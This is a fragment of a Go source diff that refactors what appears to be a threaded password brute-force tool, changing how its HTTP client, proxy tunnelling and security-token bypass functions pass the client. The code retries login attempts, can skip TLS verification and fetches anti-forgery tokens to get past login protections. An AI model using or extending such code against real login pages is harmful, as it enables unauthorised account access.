@@ -271,7 +271,7 @@ func Start() error {
 // launching the thread brute-force attack
 func _run_attack(pass string) error {
 	if !Attack.Stop {
-		client := http.Client{
+		client := &http.Client{
 			Timeout: 15 * time.Second,
 		}
 		jar, err := cookiejar.New(nil)
@@ -280,9 +280,9 @@ func _run_attack(pass string) error {
 		}
 		client.Jar = jar
 
-		// Adding proxy, if there is any
+		// Applying proxy tunnel to the request
 		if proxy.IsProxy() {
-			client.Transport = proxy.Drive()
+			proxy.Apply(client)
 		} else if IgnoreTLS {
 			client.Transport = &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
 		}
@@ -336,7 +336,7 @@ func _run_attack(pass string) error {
 		}
 
 		middleware := middleware.Middleware {
-			Client: &client,
+			Client: client,
 			Request: req,
 		}
 		err = middleware.Do()
@@ -352,7 +352,6 @@ func _run_attack(pass string) error {
 		resp, err := client.Do(req)
 		if err != nil {
 			// if there was any error, repeating the same request again until it's successful.
-
 			AttackFail.Password = pass
 			AttackFail.Try_count++
 
@@ -493,11 +492,11 @@ func Bypassing_Security_Token(client *http.Client) (string, error) {
 }
 
 // finding the token
-func Find_Token(client http.Client) (token string) {
+func Find_Token(client *http.Client) (token string) {
 	var err error
 	// finding the token
 	try_again:
-		token, err = Bypassing_Security_Token(&client)
+		token, err = Bypassing_Security_Token(client)
 		if err != nil {
 			// if the request failed to get the token, repeating the request again until it's successful.
 			goto try_again
